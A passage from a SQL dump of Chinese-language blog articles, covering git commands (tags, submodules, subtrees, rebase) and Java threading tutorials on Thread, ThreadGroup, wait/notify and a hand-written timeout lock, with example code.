stash drop stash@{0}*: 删除list中保存状态\n7. *git stash apply stash@{0}*: 读取指定的临时保存状态\n\n#### 标签\n1. *git tag v1.0.1*: 创建一个轻量级标签 \n2. *git tag -a v1.0.2 -m \'release version\'*: 创建一个带有附注的标签\n3. *git tag -d v1.0.1*: 删除标签\n4. *git tag -l \'v1.0\'*: 查找标签\n5. *git tag -l \'v\'*: 通配符查找标签\n6. *git tag*: 查看标签列表\n7. *git show v1.0*: 显示标签信息\n8. *git push origin v1.0*: 推送标签,tag指向提交点,并且静态不会变动\n9. *git push origin v1.0 v2.0*: 批量推送标签\n10. *git push origin --tags*: 推送本地未推送的所有标签\n11. *git push origin refs/tags/v7.0:refs/tags/v7.0*: 将标签从本地推送到远程的完整写法\n12. *git push origin  :refs/tags/v1.0*: 推送空标签,相当于删除标签\n13. *git push origin --delete tag v1.0*: 删除标签,与上面做法等价\n14. *git fetch origin tag v1.0*: 拉取标签\n\n#### 文件归咎\n1. *git blame --help*: 查看帮助\n2. *git blame test.txt*: 查看修订信息\n\n#### diff比较\n1. *git diff*: 比较工作区与暂存区文件之间的差别 源是暂存区,目标文件是工作区\n2. *git diff commit_id*: 比较版本库提交与工作区之间差别,commit_id也可以是HEAD表示比较最新的提交 源是已提交,目标文件是工作区\n3. *git diff --cached commit_id*: 比较暂存区与版本库提交区别,去掉commit_id表示比较最新的提交 源是已提交,目标是暂存区\n4. 与系统的diff相同,-指的是源,+指的是目标\n\n### 常见问题\n#### add.与add*区别\n1. add . 考察.gitignore文件\n2. add * 不考察.gitignore文件\n\n#### git rm\n1. *git rm test2.txt*: 删除了一个文件,并将被删除的文件纳入到暂存区中(stage, index)\n2. 若想恢复被删除的文件,需要进行两个动作:\n3. *git reset HEAD test2.txt*  将待删除的文件从暂存区恢复到工作区\n4. *git checkout -- test2.txt* 将工作区中的修改丢弃掉\n5. 若使用系统的*rm test2.txt*,将test2.txt删除,使用系统rm被删除的文件并未纳入暂存区当中\n\n#### git mv\n1. *git mv test.txt test2.txt*: 重命名了一个文件,并将文件纳入到暂存区中\n2. 若使用系统的*mv test.txt test2.txt*,删除了test.txt,新增了test2.txt,并未纳入暂存区当中\n\n#### 用户信息\n1. 对于*user.name*与*user.email*来说,有3个地方可以设置\n2. /etc/gitconfig (几乎不会使用)   *git config --system*\n3. ~/.gitconfig (很常用) *git config --global*\n4. 针对于特定项目的, .git/config文件中 *git config --local*\n5. 查看gitconfig内容 *git config --list*\n6. 删除gitconfig内容 *git config --local --unset user.name*\n7. 获取帮助 *git help config*, *git config --help*, *man git-config*\n\n#### 命令别名\n1. *git config --local alias.br branch*	将branch别名取为br\n2. *git config --local alias.ui \'!gitk\'* 执行外部命令\n\n#### .gitigonre文件语法\n```java\n*.b  包括所有的.b结尾文件\n!a.b  除了a.b以外文件\n/test3.txt   仅仅忽略项目根目录下的test3.txt文件,不包括subdir/test3.txt\n/*/test3.txt   特定的一层目录\n/**/test3.txt   所有的目录层次\nmydir/   忽略mydir/目录下所有文件\nmydir/*.txt    忽略mydir/test3.txt,但不包括mydir/子目录/test3.txt	\nmydir/*/*.txt    忽略mydir下层次的所有的txt,但不包括更深层次\nmydir/**/*.txt   忽略mydir下层次所有的txt,所有的目录层次\n```\n\n#### .git目录\n1. *config:* 显示远程分支等相关信息\n2. *refs/heads*: 本地分支\n3. *refs/remotes*: 本地远程分支,本质上起到本地git分支与github所处分支中转作用,更新时,从远端先拉取更新文件内容,git修改origin分支指向,然后再跟本地分支做合并\n4. *refs/tags*: 标签\n\n#### submodule\n```java\n// submodule是用于git仓库引入另一个git仓库而提供的方案\n// 外仓库与子仓库,默认修改不会更新子仓库,除非进入子仓库执行foreach相应命令\ngit submodule add git@github.com:tuwq/git_child.git mymodule //  添加子模块,mymodule目录事先必须不存在\n\ncd mymodule, git pull // 进入 mymodule目录执行git pull即可更新\n\ngit submodule foreach git pull // 遍历依赖的所有submodule执行git pull\n\n// clone含有submodule的项目,默认不会同时clone那些submodule代码,需要手动的去执行\ngit submodule init\ngit submodule update --recursive\ngit clone git@github.com:tuwq/git_parent.git git_parentdir --recursive\n// 添加--recursive后将一并把submodule克隆下来\n\n// 删除submodule\ngit rm --cached mymodule 从暂存区当中把文件移除\nrm -rf mymodule 从工作区中删除\nrm .gitmodules\ngit add .\ngit commit -m \'remove submodule\'\ngit push\n```\n\n#### subtree\n```java\n// subtree也是用于git仓库引入另一个git仓库而提供的方案\n// 它是用来替代submodule的方案,因为submodule在外层仓库更新子仓库会出现许多的问题\ngit subtree // 显示相关命令\ngit remote add subtree-origin1 git@github.com:tuwq/git_subtree_child.get // 添加远程库\ngit subtree add --prefix=subtreedir subtree-origin1 master // 将远程被依赖的库代码克隆到subtreedir目录下\ngit subtree pull --prefix=subtreedir subtree-origin1 master --squash // 更新subtree,--squash merge时可选参数会将待合并提交整合在一起合并,之前的提交历史会丢失\ngit push // 修改subtree推送到自身项目\ngit subtree push --prefix=subtreedir subtree-origin1 master // 将subtree的修改推送到subtree的分支上去\n\n// --squash 提交归并\n// 把多个条目放在一起\n// 如果在subtree使用--squash,它会将subtree-origin master的多个提交给合并成一个最新提交\n// 这一个提交里面的commit_message就是所有commit_message连接在一起\n// subtree主目录只能看到这个合并提交的commit_id,而不知道组成的三个commit_id\n// 当subtree合并更新时,又会产生一个merge提交\n// 防止子仓库(subtreedir1)它的提交历史污染了外层(parent)的仓库\n// 但不恰当使用会造成找不到三方原则共同的祖先提交点,导致冲突错误\n// 注意! 要么一直使用--squash,要么一直不使用--squash,绝不能一会使用一会不使用,否则会三方合并原则错误\n```\n#### cherry pick\n1. 可以将一个分支上的提交转移到另一个分支上\n2. 当前在master分支上调用,*git cherry-pick 5a263*(其他分支的提交)将这个提交点应用到master分支上\n\n#### rebase\n```java\n// rebase: 变基,意即改变分支的根基\n// 从某种程度上来说,rebase与merge可以完成类似的工作,不过二者的工作方式有着显著的差异\n// merge会产生一个新的提交,这个提交会指向之前要合并的两个分支,,是两个parent\n// rebase并不是将两个分支进行合并,而是将一个分支上面的修改应用到了另一个分支上面,结果就是条直线,而不是分叉线\ngit checkout mywork\ngit rebase origin\n// git merge不会修改提交历史,git rebase会修改提交历史\n// 不要对master分支执行rebase,否则会引起很多问题\n// 一般来说,执行rebase的分支都是自己的本地分支,没有尚未推送到远程版本库\n// 绝对不要在与别人共享的分支上做rebase操作\ngit checkout test\ngit rebase develop\n// 将test后面的提交已补丁保存起来,将这些补丁已回放的形式在develop进行一个个提交的回放\n// 回放完毕后,在test后面的那些提交实际上就没有用了,会被git的gc处理掉\n```', 2, 0, 64, 0, 0, '2019-09-22 20:53:09', '2019-09-25 21:25:01', 0, 0);
INSERT INTO `article` VALUES (88, 1, '线程Thread与ThreadGroup', '2019/10/1570023055_mmexport1570022340458.jpg', '### 概念\n#### 并发与并行\n1. *并行*: 多核CPU并行,同时执行\n2. *并发*: 单个CPU在进程之间切换,看起来程序并行\n\n#### Java线程概念\n1. **Java应用程序的main函数是一个线程**,是被JVM启动的时候调用,线程的名字叫main\n2. 实现一个线程,必须创建Thread实例,*override run*方法,并且调用start方法\n3. **在JVM启动后,实际上有多个线程,但是有一个非守护线程main**\n4. **当你调用一个线程start方法的时候,此时至少有两个线程**,一个是调用的线程,还有一个执行run方法的线程\n\n#### 线程的生命周期\n![threadstatus.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570023571_threadstatus.png)\n\n### Thread对象\n#### 默认线程名称\n1. 创建线程对象Thread,默认有一个线程名,已Thread-开头,从0开始计数\n2. 构造函数 Thread()\n\n#### 传递runnable与复写run方法\n1. 如果在构造Thread的时候没有传递Runnable或者没有复写Thread的run方法,该Thread将不会调用任何东西\n2. 如果传递了Runnable接口的实例或者复写了Thread的run方法,则会执行该方法的逻辑单元(逻辑代码)\n3. 构造函数Thread(),Thread(Runnable),Thread(Runnable, String),Thread(String)\n\n#### stackSize参数\n![thread03zhanzhen.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570025494_thread03zhanzhen.png)\n1. **虚拟机栈是线程私有的,它的生命周期和线程相同**\n2. **虚拟机栈每个方法在执行的同时都会创建一个栈帧（Stack Frame)**\n3. 栈帧用于存储局部变量表、操作栈、动态链接、方法出口等信息\n4. stackSize指的是栈帧的数量(深度)\n4. 构造Thread的时候传入stackSize代表着该线程占用的stack大小,如果没有指定stackSize的大小,默认是0,0代表着会忽略该参数\n5. 该参数会被JNI函数去使用,需要注意: 该参数有一些平台有效,有些平台则无效\n\n#### Daemon守护线程\n```java\n	public static void main(String[] args) {\n        Thread t = new Thread(() -> {\n            Thread innerThread = new Thread(() -> {\n                try {\n                    while (true) {\n                        System.out.println(\"Do some thing for health check.\");\n                        Thread.sleep(1_000);\n                    }\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            });\n            // innerThread.setDaemon(true); // innerThread跟随t终止\n            innerThread.start();\n            try {\n                Thread.sleep(100);\n                System.out.println(\"T thread finish done.\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n        // t.setDaemon(true); // t跟随main终止\n        t.start();\n    }\n```\n1. 守护线程,当threadGroup线程执行完毕后,被设置为setDaemon(true)的守护线程将会终止任务跟随死亡\n2. 许多框架的start方法的线程都是守护线程,跟随主线程死亡\n\n#### Priority优先级\n```java\n	public static void main(String[] args) {\n        Thread t1 = new Thread(() -> {\n            for (int i = 0; i < 1000; i++) {\n                Optional.of(Thread.currentThread().getName() + \"-index\" + i).ifPresent(System.out::println);\n            }\n        });\n        t1.setPriority(Thread.MAX_PRIORITY);\n        Thread t2 = new Thread(() -> {\n            for (int i = 0; i < 1000; i++) {\n                Optional.of(Thread.currentThread().getName() + \"-index\" + i).ifPresent(System.out::println);\n            }\n        });\n        t2.setPriority(Thread.NORM_PRIORITY);\n        Thread t3 = new Thread(() -> {\n            for (int i = 0; i < 1000; i++) {\n                Optional.of(Thread.currentThread().getName() + \"-index\" + i).ifPresent(System.out::println);\n            }\n        });\n        t3.setPriority(Thread.MIN_PRIORITY);\n        t1.start();t2.start();t3.start();\n    }\n```\n1. Priority优先级,CPU调度的优先级\n\n#### Join等待执行结束\n```java\npublic class ThreadJoin3 {\n    public static void main(String[] args) throws InterruptedException {\n        long startTimestamp = System.currentTimeMillis();\n        Thread t1 = new Thread(new CaptureRunnable(\"M1\", 10000L));\n        Thread t2 = new Thread(new CaptureRunnable(\"M2\", 10000L));\n        Thread t3 = new Thread(new CaptureRunnable(\"M3\", 10000L));\n        t1.start();\n        t2.start();\n        t3.start();\n        t1.join();\n        t2.join();\n        t3.join();\n        long endTimestamp = System.currentTimeMillis();\n        System.out.printf(\"Save data begin timestamp is:%s, end timestamp is:%s\", startTimestamp, endTimestamp);\n    }\n}\nclass CaptureRunnable implements Runnable {\n    private String machineName;\n\n    private long spendTime;\n    public CaptureRunnable(String machineName, long spendTime) {\n        this.machineName = machineName;\n        this.spendTime = spendTime;\n    }\n    @Override\n    public void run() {\n        // do the really capture data.\n        try {\n            Thread.sleep(spendTime);\n            System.out.printf(machineName + \"completed data capture at timestamp [%s] and successfully\\n\", System.currentTimeMillis());\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n    public String getResult() {\n        return machineName + \"finish.\";\n    }\n}\n```\n1. *join*: 当前线程等待该线程执行结束\n2. *Thread.currentThread().join()*: 当前线程join住,直到当前线程死掉,使得自己一直在运行状态\n\n#### interrupt中断线程\n```java\n// 使用标识关闭\npublic class ThreadCloseGraceful {\n    private static class Worker extends Thread {\n        private volatile boolean start = true;\n        \n        @Override\n        public void run() {\n            while (start) {\n\n            }\n        }\n        public void shutdown() {\n            this.start = false;\n        }\n    }\n    public static void main(String[] args) {\n        Worker worker = new Worker();\n        worker.start();\n        try {\n            Thread.sleep(10_000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        worker.shutdown();\n    }\n} \n```\n```java\n// 使用interrupted关闭\npublic class ThreadCloseGraceful2 {\n    private static class Worker extends Thread {\n        @Override\n        public void run() {\n            while (true) {\n                // 使用interrupted判断是否中断进行终止\n                if (Thread.interrupted()) {\n                    break;\n                }\n                // 或者下面这种方法,捕获异常进行终止\n                try {\n                    Thread.sleep(1);\n                } catch (InterruptedException e) {\n                    break;\n                }\n            }\n        }\n    }\n    public static void main(String[] args) {\n        Worker worker = new Worker();\n        worker.start();\n        try {\n            Thread.sleep(10_000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        worker.interrupt();\n    }\n}\n```\n1. interrupt用于终止线程,也可以使用标识方式进行终止\n2. interrupt可以打断主线程\n\n#### 子线程打断主线程\n```java\npublic class ThreadInterupt2 {\n    public static void main(String[] args) {\n        Thread t = new Thread() {\n            @Override\n            public void run() {\n                while (true) {\n\n                }\n            }\n        };\n        t.start();\n        Thread main = Thread.currentThread();\n        Thread t2 = new Thread() {\n            @Override\n            public void run() {\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                main.interrupt(); // t2打断main线程\n                System.out.println(\"interrupt\");\n            }\n        };\n        t2.start();\n        try {\n            t.join(); // main等待t执行结束,显然永远也不会结束\n        } catch (InterruptedException e) {\n            System.out.println(\"main线程被打断了,捕获异常\");\n            e.printStackTrace();\n        }\n        System.out.println(\"end\");\n    }\n}\n```\n1. interrupt可以打断主线程\n\n#### 自定义超时打断机制\n```java\npublic class ThreadCloseForce {\n    public static void main(String[] args) {\n        ThreadService service = new ThreadService();\n        long start = System.currentTimeMillis();\n        service.execute(()->{\n            // load a very heavy resource\n            try {\n                Thread.sleep(50_000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n        service.shutdown(10_000);\n        long end = System.currentTimeMillis();\n        System.out.println(end - start);\n    }\n}\npublic class ThreadService {\n\n    private Thread executeThread;\n\n    private boolean finished = false;\n\n    public void execute(Runnable task) {\n        executeThread = new Thread() {\n            @Override\n            public void run() {\n                Thread runner = new Thread(task);\n                runner.setDaemon(true);\n                runner.start();\n                try {\n                    runner.join();\n                    finished = true;\n                } catch (InterruptedException e) {\n                    // e.printStackTrace();\n                }\n            }\n        };\n        executeThread.start();\n    }\n    public void shutdown(long mills) {\n        long currentTime = System.currentTimeMillis();\n        while (!finished) {\n            if ((System.currentTimeMillis() - currentTime) >= mills) {\n                System.out.println(\"任务超时,需要结束它!\");\n                executeThread.interrupt();\n                break;\n            }\n            try {\n                executeThread.sleep(1);\n            } catch (InterruptedException e) {\n                System.out.println(\"代理执行线程被打断\");\n                break;\n            }\n        }\n        finished = false;\n    }\n}\n```\n1. 通过守护线程这一巧妙的机制,通过daemon,join,interrupt等方式即可实现超时打断的机制\n\n\n#### waitSet\n```java\npublic class WaitSet {\n\n    private static final Object LOCK = new Object();\n\n    private static void work() {\n        synchronized (LOCK) {\n            System.out.println(\"Begin....\");\n            try {\n                System.out.println(\"Thread will coming.\");\n                LOCK.wait();// 唤醒后将重新获取锁但会继续从此处执行,因为wait时记录执行地址 唤醒时恢复执行地址位置\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"Thread will out.\");\n        }\n    }\n\n    /**\n     * 1. 所有的对象都会有一个wait set,用来存放调用了该对象wait方法之后进入block状态线程\n     * 2. 线程被notify之后,不一定立即得到执行\n     * 3. 线程从wait set中被唤醒的顺序不一定是 FIFO。\n     * 4. 线程被唤醒后,必须重新获取锁,执行记录从wait的位置开始\n     * @param args\n     */\n    public static void main(String[] args) throws InterruptedException {\n        new Thread() {\n            @Override\n            public void run() {\n                work();\n            }\n        }.start();\n        Thread.sleep(1_000);\n        synchronized (LOCK) {\n            LOCK.notify();\n        }\n        IntStream.rangeClosed(1, 10)\n                .forEach(i -> {\n                    new Thread(String.valueOf(i)) {\n                        @Override\n                        public void run() {\n                            synchronized (LOCK) {\n                                try {\n                                    Optional.of(Thread.currentThread().getName() + \" will come to wait set.\").ifPresent(System.out::println);\n                                    LOCK.wait();\n                                    Optional.of(Thread.currentThread().getName() + \" will leave to wait set.\").ifPresent(System.out::println);\n                                } catch (InterruptedException e) {\n                                    e.printStackTrace();\n                                }\n                            }\n                        }\n                    }.start();\n                });\n\n        Thread.sleep(3_000);\n\n        IntStream.rangeClosed(1, 10)\n                .forEach( i ->{\n                    synchronized (LOCK) {\n                        LOCK.notify();\n                        try {\n                            Thread.sleep(1_000);\n                        } catch (InterruptedException e) {\n                            e.printStackTrace();\n                        }\n                    }\n                });\n    }\n}\n```\n1. 所有的对象都会有一个wait set（可以这么理解）,用来存放调用了该对象wait方法之后进入block状态线程\n2. 线程被notify之后,不一定立即得到执行,而是进入Runnable状态\n3. 线程从wait set中被唤醒的顺序不一定是FIFO,策略并没有详细的规范定义\n4. 线程被唤醒后,必须重新获取锁,之所以是从wait位置开始执行是因为wait时记录了执行位置,重新唤醒后恢复执行位置在wait方法处开始执行\n \n\n#### wait,notify,notifyAll实现多线程通信\n```java\n// 单生产者与单消费者版本\npublic class ProduceConsumerVersion2 {\n\n    private int i = 0;\n    private final Object LOCK = new Object();\n    private volatile boolean isProduced = false;\n\n    public void produce() {\n        synchronized (LOCK) {\n            if (isProduced) {\n                try {\n                    LOCK.wait();\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            } else {\n                i++;\n                System.out.println(\"P->\" + i);\n                LOCK.notify();\n                isProduced = true;\n            }\n        }\n    }\n\n    public void consume() {\n        synchronized (LOCK) {\n            if (isProduced) {\n                System.out.println(\"C->\" + i);\n                LOCK.notify();\n                isProduced = false;\n            } else {\n                try {\n                    LOCK.wait();\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        ProduceConsumerVersion2 pc = new ProduceConsumerVersion2();\n        new Thread() {\n            @Override\n            public void run() {\n                while (true) {\n                    pc.produce();\n                }\n            }\n        }.start();\n\n        new Thread() {\n            @Override\n            public void run() {\n                while (true) {\n                    pc.consume();\n                }\n            }\n        }.start();\n    }\n}\n``` \n```java\n// 多生产者与多消费者版本\npublic class ProduceConsumerVersion3 {\n    private int i = 0;\n    private final Object LOCK = new Object();\n    private volatile boolean isProduced = false;\n\n    public void produce() {\n        synchronized (LOCK) {\n            while (isProduced) {\n                try {\n                    LOCK.wait();\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n            i++;\n            System.out.println(\"P->\" + i);\n            LOCK.notifyAll();\n            isProduced = true;\n        }\n    }\n\n    public void consume() {\n        synchronized (LOCK) {\n            while (!isProduced) {\n                try {\n                    LOCK.wait();\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n            System.out.println(\"C->\" + i);\n            LOCK.notifyAll();\n            isProduced = false;\n        }\n    }\n\n    public static void main(String[] args) {\n        ProduceConsumerVersion3 pc = new ProduceConsumerVersion3();\n        Stream.of(\"P1\", \"P2\").forEach(n ->\n                new Thread() {\n                    @Override\n                    public void run() {\n                        while (true) {\n                            pc.produce();\n                        }\n                    }\n                }.start()\n        );\n        Stream.of(\"C1\", \"C2\").forEach(n ->\n                new Thread() {\n                    @Override\n                    public void run() {\n                        while (true) {\n                            pc.consume();\n                        }\n                    }\n                }.start()\n        );\n    }\n} \n```\n1. *wait()*: 使当前线程wait,等价于wait(0),这个对象必须有一个对象监视器(LOCK),这个线程的它释放关于这个锁的所有权,直到有一个线程通过*notify*或*notifyAll*将它唤醒,唤醒之后它就具备可运行状态,等待抢到锁 \n2. *notify*: 唤醒正在该对象的监视器上等待的任意一个线程\n3. *notifyAll*: 唤醒正在该对象的监视器上等待的所有线程\n\n#### sleep与wait的区别\n```java\npublic class DifferenceOfWaitAndSleep {\n\n    private final static Object LOCK = new Object();\n\n    public static void main(String[] args) {\n        Stream.of(\"T1\", \"T2\").forEach( name ->\n            new Thread(name) {\n                @Override\n                public void run() {\n                    m1();\n                }\n            }.start()\n        );\n    }\n\n    public static void m1() {\n        synchronized (LOCK) {\n            try {\n                System.out.println(\"The Thread \" + Thread.currentThread().getName() + \"enter.\");\n                Thread.sleep(2_000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public static void m2() {\n        synchronized (LOCK) {\n            try {\n                System.out.println(\"The Thread \" + Thread.currentThread().getName() + \"enter.\");\n                LOCK.wait();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n1. sleep是Thread的方法,wait是Object的方法\n2. sleep不会释放锁,wait会释放锁,并且把它加入到Object监视器的wait queue中\n3. sleep并不需要定义syncronized,wait需要定义syncronized\n4. sleep并不需要被唤醒,wait需要被唤醒(wait(timeout)自动唤醒除外)\n\n#### 自定义线程工作队列\n```java\npublic class CaptureService {\n\n    private static LinkedList<Control> CONTROLS = new LinkedList<Control>();\n    private final static int MAX_WORKER = 5;\n\n    public static void main(String[] args) {\n        List<Thread> worker = new ArrayList<Thread>();\n        Arrays.asList(\"M1\", \"M2\", \"M3\", \"M4\", \"M5\", \"M6\", \"M7\", \"M8\", \"M9\", \"M10\").stream()\n            .map(CaptureService::createCaptureThread)\n            .forEach(t -> {\n                t.start();\n                worker.add(t);\n            });\n        worker.stream().forEach(t -> {\n            try {\n                t.join();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n\n        Optional.of(\"All of capture work finished\").ifPresent(System.out::println);\n    }\n\n    private static Thread createCaptureThread(String name) {\n        return new Thread(()->{\n            Optional.of(\"The worker [\" + Thread.currentThread().getName() + \"] begin capture data.\").ifPresent(System.out::println);\n            synchronized (CONTROLS) {\n                while (CONTROLS.size() > MAX_WORKER) {\n                    try {\n                        CONTROLS.wait();\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                }\n                CONTROLS.addLast(new Control());\n            }\n            Optional.of(\"The worker [\" + Thread.currentThread().getName() + \"] is working...\").ifPresent(System.out::println);\n            try {\n                Thread.sleep(10_000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            synchronized (CONTROLS) {\n                Optional.of(\"The worker [\" + Thread.currentThread().getName() + \"] END capture data.\").ifPresent(System.out::println);\n                CONTROLS.removeFirst();\n                CONTROLS.notifyAll();\n            }\n        }, name);\n    }\n\n    private static class Control {\n\n    }\n}\n```\n\n#### 程序终止钩子\n```java\nRuntime.getRuntime().addShutdownHook(new Thread(()->{\n    System.out.println(\"shutdown release resource...\");\n}));\n``` \n1. *kill pid* 可以正常执行钩子\n2. *kill -9* pid 不会正常执行钩子,这种强制终止程序的方式是不推荐的\n\n#### 打印执行堆栈\n```java\nArrays.asList(Thread.currentThread().getStackTrace()).stream()\n            .filter(e -> !e.isNativeMethod())\n            .forEach(e -> Optional.of(e.getClassName()+\":\"+e.getMethodName()+\":\"+e.getLineNumber()).ifPresent(System.out::println));\n```\n1. 用于打印堆栈,便于查看调用信息\n\n### ThreadGroup对象\n#### ThreadGroup是什么\n![threadGroup01.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570087762_threadGroup01.png)\n1. 一个ThreadGroup代表了一组线程,一个ThreadGroup可以包含其他的ThreadGroup\n2. ThreadGroup是一个树形结构,每次创建的时候都有一个父的ThreadGroup,通过ThreadGroup可以访问自己的thread一些信息\n3. 如果构造线程对象时未传入ThreadGroup,则Thread会默认获取父线程的ThreadGroup作为该线程的ThreadGroup,此时子线程和父线程将会在同一个threadGroup中,通过threadGroup可以知道这个threadGroup下有多少个线程在运行,从而进行统一管理\n\n#### thread与threadGroup关系\n```java\n	public static void main(String[] args) throws InterruptedException {\n        ThreadGroup tg1 = new ThreadGroup(\"TG1\");\n        Thread t1 = new Thread(tg1, \"T1\") {\n            @Override\n            public void run() {\n                while (true) {\n                    try {\n                        Thread.sleep(10_000);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                        break;\n                    }\n                }\n            }\n        };\n\n        ThreadGroup tg2 = new ThreadGroup(tg1, \"TG2\");\n        Thread t2 = new Thread(tg2, \"T2\") {\n            @Override\n            public void run() {\n                while (true) {\n                    try {\n                        Thread.sleep(1_000);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                        break;\n                    }\n                }\n            }\n        };\n        t2.start();\n\n        System.out.println(tg1.activeCount());// 有几个thread,2,tg1下有一个直属的thread,tg1下tg2下有一个thread\n        System.out.println(tg1.activeGroupCount());// 有几个threadGroup,1\n        t2.checkAccess();// 确定当前正在运行的线程是否有权修改此线程\n        // tg1.destroy();// 关闭threadGroup以及所有子threadGroup,必须其中的thread必须处于不活跃状态否则抛出IllegalThreadStateException\n\n        // 拷贝一些线程和子threadGroup\n        System.out.println(\"=================================\");\n        Thread[] ts1 = new Thread[tg1.activeCount()];\n        tg1.enumerate(ts1);\n        Arrays.asList(ts1).forEach(System.out::println);\n\n        System.out.println(\"=================================\");\n        tg1.enumerate(ts1, true);\n        Arrays.asList(ts1).forEach(System.out::println);\n\n        System.out.println(\"=================================\");\n        ts1 = new Thread[10];\n        Thread.currentThread().getThreadGroup().enumerate(ts1, true); // true: 包含得到子threadGroup的thread,false: 不包含子threadGroup的thread\n        Arrays.asList(ts1).forEach(System.out::println);\n\n        tg1.interrupt();\n    } \n```\n1. *activeCount()*: 当前threadGroup下有几个thread,包括子threadGroup的thread\n2. *activeGroupCount()*: 当前threadGroup下有几个子threadGroup\n3. *destroy()*: 关闭threadGroup以及所有子threadGroup,必须其中的thread必须处于不活跃状态否则抛出IllegalThreadStateException\n4. *enumerate(Thread[], boolean)*: 遍历拷贝线程,第二个参数决定是否递归获取子threadGroup下的thread\n5. *interrupt()*: 中断此threadGroup下的所有thread,包括子threadGroup的thread\n\n#### Daemon与Destroy\n```java\n	ThreadGroup tg1 = new ThreadGroup(\"TG1\");\n        Thread t1 = new Thread(tg1, \"T1\") {\n            @Override\n            public void run() {\n                while (true) {\n                    try {\n                        Thread.sleep(10_000);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                        break;\n                    }\n                }\n            }\n        };\n        tg1.setDaemon(true); // threadGroup最后一个线程t1线程执行完,那么自动会将threadGroup进入destroy状态,否则不会进入destroy状态\n        t1.start();\n        Thread.sleep(2_000);\n        System.out.println(tg1.isDestroyed());\n        tg1.destroy(); // 也可以手动调用destroy手动回收\n	// 关闭threadGroup以及所有子threadGroup,必须其中的thread必须处于不活跃状态否则抛出IllegalThreadStateException\n```\n1. threadGroup设置Daemon守护线程,那么*当threadGroup中最后一个线程t1线程执行完,那么自动会将threadGroup进入destroy状态*,否则threadGroup不会进入destroy状态\n2. 也可以通过手动调用destroy()进行关闭\n3. *destroy()*: 关闭threadGroup以及所有子threadGroup,必须其中的thread必须处于不活跃状态否则抛出IllegalThreadStateException', 0, 0, 35, 0, 0, '2019-10-02 21:31:03', '2019-10-05 22:13:18', 0, 0);
INSERT INTO `article` VALUES (89, 1, '手写线程同步lock', '2019/10/1570088036_mmexport1570087996741.jpg', '### 实现线程lock锁\n#### 要求实现\n1. 基本的同步锁加锁与释放锁\n2. 锁的等待超时机制\n\n#### 定义接口\n```java\npublic interface Lock {\n\n    class TimeOutException extends Exception {\n        public TimeOutException(String message) {\n            super(message);\n        }\n    }\n\n    void lock() throws InterruptedException;\n\n    void lock(long mills) throws InterruptedException, TimeOutException;\n\n    void unlock();\n\n    Collection<Thread> getBlockedThread();\n\n    int getBlockedSize();\n}\n```\n#### 实现一个lock\n```java\npublic class BooleanLock implements Lock {\n\n    // The initValue is true indicated the lock have be get\n    // The initValue is false indicated the lock is free (other thread can get this.)\n    private boolean initValue;\n\n    private Collection<Thread> blockedThreadCollection = new ArrayList<Thread>();\n\n    private Thread currentThread;\n\n    public BooleanLock() {\n        this.initValue = false;\n    }\n\n    @Override\n    public synchronized void lock() throws InterruptedException {\n        while (initValue) {\n            blockedThreadCollection.add(Thread.currentThread());\n            this.wait();\n        }\n        blockedThreadCollection.remove(Thread.currentThread());\n        this.initValue = true;\n        this.currentThread = Thread.currentThread();\n    }\n\n    @Override\n    public synchronized void lock(long mills) throws InterruptedException, TimeOutException {\n        if (mills <= 0) {\n            lock();\n        }\n        long hasRemaining = mills;\n        long endTime = System.currentTimeMillis() + mills;\n        while (initValue) {\n            if (hasRemaining <= 0) {\n                throw new TimeOutException(\"Time out\");\n            }\n            blockedThreadCollection.add(Thread.currentThread());\n            this.wait(mills);\n            hasRemaining = endTime - System.currentTimeMillis();\n        }\n        // blockedThreadCollection.remove(Thread.currentThread());\n        this.initValue = true;\n        this.currentThread = Thread.currentThread();\n    }\n\n    @Override\n    public synchronized void unlock() {\n        if (Thread.currentThread() == currentThread) {\n            this.initValue = false;\n            Optional.of(Thread.currentThread() + \" released the lock monitor.\").ifPresent(System.out::println);\n            this.notifyAll();\n        }\n    }\n\n    @Override\n    public Collection<Thread> getBlockedThread() {\n        return Collections.unmodifiableCollection(blockedThreadCollection);\n    }\n\n    @Override\n    public int getBlockedSize() {\n        return blockedThreadCollection.size();\n    }\n}\n```\n#### 测试\n```java\npublic class LockTest {\n    public static void main(String[] args) throws InterruptedException {\n        final BooleanLock booleanLock = new BooleanLock();\n        Stream.of(\"T1\", \"T2\", \"T3\", \"T4\").forEach(name ->\n            new Thread(() -> {\n                try {\n                    booleanLock.lock(2_000L);\n                    Optional.of(Thread.currentThread().getName() + \" have the lock Monitor\").ifPresent(System.out::println);\n                    work();\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } catch (Lock.TimeOutException e) {\n                    Optional.of(Thread.currentThread().getName() + \" time out\").ifPresent(System.out::println);\n                } finally {\n                    booleanLock.unlock();\n                }\n            }, name).start()\n        );\n    }\n\n    private static void work() throws InterruptedException {\n        Optional.of(Thread.currentThread().getName() + \"is Working...\").ifPresent(System.out::println);\n        Thread.sleep(40_000);\n    